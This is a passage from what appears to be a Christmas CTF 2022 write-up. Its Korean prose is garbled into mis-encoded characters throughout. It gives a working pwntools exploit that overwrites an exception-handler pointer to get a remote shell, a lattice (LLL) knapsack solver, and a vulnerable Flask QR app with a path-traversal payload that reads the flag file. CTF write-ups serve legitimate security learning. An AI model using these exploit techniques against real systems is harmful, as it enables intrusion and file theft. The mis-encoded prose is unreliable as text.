ë°”ë¡œ ì—¬ê¸°ìˆëŠ” nameì´ë‹¤. í´ë˜ìŠ¤ì˜ ë©¤ë²„í•¨ìˆ˜ë‹ˆê¹Œ nameì— ì§ì ‘ì ìœ¼ë¡œ ì ‘ê·¼ì´ ê°€ëŠ¥í•œê±°ë‹¤. ê·¸ë¦¬ê³  nameë°”ë¡œ ë°‘ì— vectorê°€ ìˆëŠ”ê±¸ ë³¼ ìˆ˜ ìˆë‹¤. ìš°ë¦¬ê°€ ë„£ë‹¤ëºë‹¤ í•  ìˆ˜ ìˆëŠ” ë²¡í„°ì´ë‹¤. ì„¤ë§ˆì„¤ë§ˆí•˜ê³  í…ŒìŠ¤íŠ¸ í•´ë´¤ëŠ”ë° vectorì£¼ì†Œì˜ í•˜ìœ„ 1ë°”ì´íŠ¸ê°€ NULLë¡œ ë®ì´ë©´ì„œ showë¡œ ë¦¬ìŠ¤íŠ¸ ë³´ë ¤í•˜ë©´ vectorê°€ ì´ìƒí•˜ê²Œ ê¼¬ì´ë©´ì„œ í„°ì¡Œë‹¤. ë¨¼ì € 2ê°œ insertí•˜ê³  ë‚˜ì„œ ë®ìœ¼ë‹ˆê¹Œ ì•ˆí„°ì¡Œë‹¤. NULLë¡œ ë®ì–´ì„œ vectorì£¼ì†Œ ë°”ê¾¼ë‹¤ìŒ deleteë¥¼ 3ë²ˆ í•´ì„œ ì²˜ìŒ insertí•œì• ë¥¼ ì‹œì‘ì ê¹Œì§€ ë•¡ê²¨ì£¼ë©´ vectorì£¼ì†Œë¥¼ ì›í•˜ëŠ”ëŒ€ë¡œ ì¤„ ìˆ˜ ìˆê²Œ ëœë‹¤. ì›í•˜ëŠ”ëŒ€ë¡œ ì¤˜ì„œ insertí•˜ë©´ aawê°€ ë˜ê³  showë¡œ ì½ìœ¼ë©´ aarì´ ëœë‹¤. ì²˜ìŒì—ëŠ” libc leakì„ í•˜ê³  free hookì„ ë®ìœ¼ë ¤í–ˆì§€ë§Œ aarì´ë‚˜ aawì¤‘ í•˜ë‚˜ë§Œ í•œë²ˆ í•  ìˆ˜ ìˆëŠ” ìƒí™©ë°–ì— ì•ˆë‚˜ì™€ì„œ ê½¤ ê³ ë¯¼ì„ ë§ì´ í–ˆë‹¤.

ê²°êµ­ ë§ì€ ì‚½ì§ˆê³¼ ê³ ë¯¼ì„ í•˜ë‹¤ê°€ leakì„ í•˜ì§€ ë§ê³  ë°”ì´ë„ˆë¦¬ ë‚´ì˜ writeableí•œ ì˜ì—­ì¤‘ì—ì„œ ë®ì„ë§Œí•œ ê³³ì„ ì°¾ì•„ë³´ìëŠ” ìª½ìœ¼ë¡œ ê²°ë¡ ì„ ëƒˆëŠ”ë°

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2033.png)

gotì— ìˆì–´ì•¼ í• ë²•í•œ í•¨ìˆ˜í¬ì¸í„°ê°€ writeableí•œ ì˜ì—­ì— ìˆì—ˆë‹¤. ì € í•¨ìˆ˜ëŠ” ì–´ë–¨ë•Œ ë¶ˆë¦¬ëŠ” í•¨ìˆ˜ì¸ì§€ êµ¬ê¸€ë§í•´ë³´ë‹ˆê¹Œ try cacheì™€ ê°™ì´ exceptionì„ ì²˜ë¦¬í• ë•Œ ë¶ˆë¦°ë‹¤ê³  í•œë‹¤. ìœˆë„ìš°ì˜ SEHì™€ ë¹„ìŠ·í•œ ê°œë… ê°™ë‹¤. ì•„ë¬´íŠ¼ ì—¬ê¸°ë¥¼ winí•¨ìˆ˜ë¡œ ë®ê³ 

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2034.png)

deleteí• ë•Œ try catchë¸”ë¡ì„ ì‚¬ìš©í•˜ë‹ˆê¹Œ tryì—ì„œ ì¼ë¶€ëŸ¬ ì—ëŸ¬ë‚˜ê²Œë” ì¸ë±ìŠ¤ë¥¼ -1ë¡œ ì¤¬ë”ë‹ˆ ì…¸ì´ ë”°ì˜€ë‹¤.

```python
from pwn import *

#context.log_level = "debug"

sla = lambda x, y : r.sendlineafter(x, y)
sa = lambda x, y : r.sendafter(x, y)
s = lambda x : r.send(x)
rvu = lambda x : r.recvuntil(x)
rv = lambda x : r.recv(x)

#r = process("./prob", stdout=PTY, stdin=PTY)
r = remote("host3.dreamhack.games", 10202)

def add(data):
    sla("> ", "1")
    sla("> ", data)

def delete(idx):
    sla("> ", "3")
    sla("> ", str(idx))
    sla(">", "y")

win = 0x4034DA

add(p64(0)+p64(0x407000)+p64(0x407000+0x20))
add(b"a"*0x18)
sla("> ", "2")
sla("Your Name", b"\x00"*0x10)

delete(3)
delete(3)
delete(2)

add(p64(win)*3)
add(p64(0x407010)*3)

sla("> ", "3")
sla("> ", "-1")

r.interactive()
```

ìµœì¢… ìµìŠ¤í”Œë¡œì‡ì€ ìœ„ì™€ ê°™ë‹¤.

<br><br><br>

# V - santaâ€™s sack

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2035.png)

cryptohackì— ìˆëŠ” ë¬¸ì œì™€ ìˆ«ì í•˜ë‚˜ì˜ ë³€ê²½ë„ ì—†ì´ ë™ì¼í•œ ë¬¸ì œì´ë‹¤. 

1/2ì„ ë„£ì–´ì„œ ë”í•´ì ¸ì„œ 0ì´ ë˜ëŠ” ë‹¤ë¥¸ ìŒë“¤ì˜ ê°€ëŠ¥ì„±ì„ ë°°ì œí•˜ê³  LLLì„ ì‹¤í–‰í•´ì£¼ë©´ ëœë‹¤. 

ex.sage

```python
from Crypto.Util.number import *

pubkey = ìƒëµ
enc = ìƒëµ

l = len(pubkey)

matrix = []

for i in range(l):
	line = [0] * (l + 1)
	line[l] = pubkey[i]
	line[i] = 1
	matrix.append(line)

line = [1 / 2] * l + [enc]
matrix.append(line)

M = Matrix(matrix)
M = M.LLL()
for line in M:
	if line[l] == 0:
		fail = 0
		for i in range(l):
			if line[i] != 1 / 2 and line[i] != -1 / 2:
				fail = 1
				break

		if fail == 0:
			val = 0
			for i in range(l):
				if line[i] == -1 / 2:
					val |= (1 << i)

			print(long_to_bytes(val))
```

flag

```
DH{M3rry_chri5tm4s_h0~h0~h0~}
```

<br><br><br>

# W - **QR Online**

```python
#!/usr/bin/env python3
import base64
import glob
import os
import shutil
from urllib.parse import urlparse, parse_qs

import qrcode
from flask import Flask, abort, render_template, request, session

with open('./flag.txt', 'r') as f:
    FLAG = f.read()

app = Flask(__name__)
app.secret_key = os.urandom(32)

class CacheMiss(Exception):
    pass

def normalize_scheme(scheme):
    return scheme + '.'

def normalize_host(host):
    return host

def normalize_path(path):
    return path.replace('/', '.')

def normalize_params(params):
    return '.' + params

def normalize_query(query):
    q = parse_qs(query.replace('/', '.'))
    qs = ''
    for k, v in q.items():
        qs += k + '=' + v[-1] + '&'
    if len(qs) != 0:
        qs = qs[:-1]
    return qs

def normalize_fragment(fragment):
    return fragment

def normalize(url):
    p = urlparse(url)
    norm_url = normalize_scheme(p.scheme)
    norm_url += normalize_host(p.netloc)
    norm_url += normalize_path(p.path)
    norm_url += normalize_params(p.params)
    norm_url += normalize_query(p.query)
    norm_url += normalize_fragment(p.fragment)
    return norm_url

def get_cache(norm_url):
    cache = glob.glob('static/cache/' + norm_url)
    if len(cache) != 1:
        raise CacheMiss('Cache Miss!')
    return cache[0]

@app.before_request
def init_session():
    if session:
        return
    session['id'] = os.urandom(32).hex()
    os.mkdir('static/users/' + session['id'])

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/qr_generator', methods=['GET', 'POST'])
def qr_generator():
    if request.method == 'GET':
        return render_template('qr_generator.html')

    # POST
    url = request.form.get('url')
    if not isinstance(url, str):
        abort(400)

    try:
        norm_url = normalize(url)
        cache = get_cache(norm_url)
        # Cache Hit
        dst = 'static/users/' + session['id'] + '/qr_code.png'
        shutil.copyfile(cache, dst)

    except CacheMiss:
        img = qrcode.make(url)
        src = f'static/cache/{norm_url}'
        img.save(src)
        dst = 'static/users/' + session['id'] + '/qr_code.png'
        shutil.copyfile(src, dst)

    except:
        abort(500)

    finally:
        if url.startswith('http://') or url.startswith('https://'):
            with open(dst, 'rb') as f:
                img_data = base64.b64encode(f.read()).decode('utf-8')
            return f'<img src="data:image/png;base64,{img_data}">'

        return 'url must starts with "http://" or "https://".'

@app.route('/qr_reader', methods=['GET', 'POST'])
def qr_reader():
    if request.method == 'GET':
        return render_template('qr_reader.html')

    # POST
    return 'in maintenance.. ğŸ‘·'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

app.pyì˜ ì†ŒìŠ¤ì½”ë“œëŠ” ì´ë ‡ë‹¤. ì²˜ìŒì—ëŠ” ë¬¸ì œ ì´ë¦„ë§Œ ë³´ê³  qrcodeëª¨ë“ˆì˜ CVEë¥¼ í™œìš©í•˜ëŠ” ë¬¸ì œì¸ì¤„ ì•Œì•˜ëŠ”ë° ë‚´ ìƒê°ë³´ë‹¤ í›¨ì”¬ ì‰¬ì› ë‹¤. urlì„ filenameìœ¼ë¡œ ë°”ê¿”ì£¼ëŠ” ë¶€ë¶„ì„ ë³´ë©´ ë‹¤ë¥¸ë°ëŠ” ëŒ€ë¶€ë¶„ /ê°€ .ìœ¼ë¡œ ì¹˜í™˜ë˜ì§€ë§Œ fragmentì—ì„  ê·¸ëŒ€ë¡œ ë°˜í™˜í•´ì¤˜ì„œ ì›í•˜ëŠ” í˜ì´ë¡œë“œ ì£¼ì…ì´ ê°€ëŠ¥í•˜ë‹¤. get_cacheì—ì„œ static/users/ì—ë‹¤ê°€ ê°€ê³µëœ urlë¶™ì—¬ì„œ ì¡´ì¬í•˜ëŠ” íŒŒì¼ì¸ì§€ ì²´í¬í•´ì£¼ëŠ”ë° ì—¬ê¸°ì„œ LFIë¡œ flag.txtì˜ ë‚´ìš©ì„ 'static/users/' + session['id'] + '/qr_code.png'ì—ë‹¤ê°€ ì ì„ ìˆ˜ ìˆë‹¤. í•˜ì§€ë§Œ ì•ì— [http://](http://ë¥¼) ë¥¼ ë¶™ì´ë©´ LFIë¥¼ ëª»í•˜ê¸° ë•Œë¬¸ì— íŒŒì¼ì— ì˜®ê²¨ ì ê¸°ë§Œ í•˜ê³  ifë¬¸ì— ê±¸ë ¤ì„œ ì´ë¯¸ì§€ë¥¼ ë³¼ìˆ˜ëŠ” ì—†ë‹¤. ê·¸ë˜ë„ ë‹¤ ë°©ë²•ì´ ìˆì—ˆë‹¤. //#/../../../../../app/flag.txtë¥¼ ì£¼ë©´ ì¼ë‹¨ ë‚´ìš©ì€ ì ì„ ìˆ˜ ìˆë‹¤.

flaskì˜ sessionì€ flask-unsignìœ¼ë¡œ ë””ì½”ë”©í•  ìˆ˜ ìˆë‹¤. ë”°ë¼ì„œ ë””ì½”ë”©í•´ì„œ session[â€™idâ€™]ê°’ì„ ì•Œì•„ë‚¼ ìˆ˜ ìˆê³  qr_code.pngíŒŒì¼ì˜ ì „ì²´ ê²½ë¡œë¥¼ ì•Œ ìˆ˜ ìˆë‹¤. /staticì´ë‹ˆê¹Œ urlìƒì—ì„œ ì§ì ‘ ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤.

ìµœì¢… ìµìŠ¤ëŠ” ë¨¼ì € urlì„ //#/../../../../../app/flag.txtë¡œ ì¤˜ì„œ pngíŒŒì¼ì— í”Œë˜ê·¸ ë‚´ìš© ì €ì¥í•œë‹¤ìŒì— /static/users/random(32)/qr_code.pngì„ ìš”ì²­í•˜ê³  ë‹¤ë¥¸ ì´ë¦„ìœ¼ë¡œ ì €ì¥ ëˆ„ë¥´ë©´ í”Œë˜ê·¸ê°€ ì íŒ íŒŒì¼ì´ ë‹¤ìš´ë°›ì•„ì§„ë‹¤.